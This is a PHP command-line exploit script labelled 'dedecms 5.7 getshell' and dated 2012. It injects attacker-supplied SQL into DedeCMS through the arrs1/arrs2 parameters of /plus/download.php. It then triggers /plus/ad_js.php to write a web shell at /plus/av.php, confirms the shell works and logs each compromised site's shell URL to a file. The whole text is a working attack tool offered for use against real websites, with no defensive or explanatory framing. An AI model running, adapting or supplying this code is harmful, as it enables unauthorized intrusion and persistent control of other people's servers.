<?php 
error_reporting(0);
@ini_set('memory_limit','-1');
set_time_limit(0);
 
 
 if(!$argv[1]){
 	
 
 echo "
/*======================================================================================
====Name:dedecms 5.7 getshell                                                       ====
========================================================================================
====Usage:php  dede.php   http://www.av.com                                         ====
========================================================================================
====Team:C0dePlay  Team    www.C0dePlay.com                                         ====
========================================================================================
====Author: Yaseng  ��WwW.Yaseng.Me��                                               ====
====Date: 2012-06-15 01:35:00                                                       ====
======================================================================================*/
";

exit();	
 	
}
 
 exploit($argv[1]);
    
    
 
 
 
 
  
  function fuck_dede($sql){
  	
   
  	  $str="";
  	  for($i=0;$i< strlen($sql);$i++){
  	
  	      $str.="arrs2[]=".ord($sql[$i])."&";
  	
     }
 
  	
  	return  $str;
  	  	
  }

   
  function  exploit($site){
   
  msg("Pentest:".$site);
  $sql1=file_get_contents("1.txt");
  file_get_contents($site."/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&".fuck_dede($sql1));
  
   
  
  file_get_contents($site."/plus/ad_js.php?aid=1&nocache=1");
  $shell=$site."/plus/av.php";
  if(strpos(file_get_contents($shell),'x')){
  	
  	msg("Exploit Succeed :".$shell);
  	file_put_contents("dedeshell.txt",$shell."\r\n",FILE_APPEND);
  	
  }else{
  	
  	msg("Exploit failed:".$shell);
  	
  }
 
 }
 
 
  function  msg($str,$type=1){
	
	 $str=($type) ? "[+]".$str : "[-]".$str;
	 echo $str."\r\n";
	
   }



?>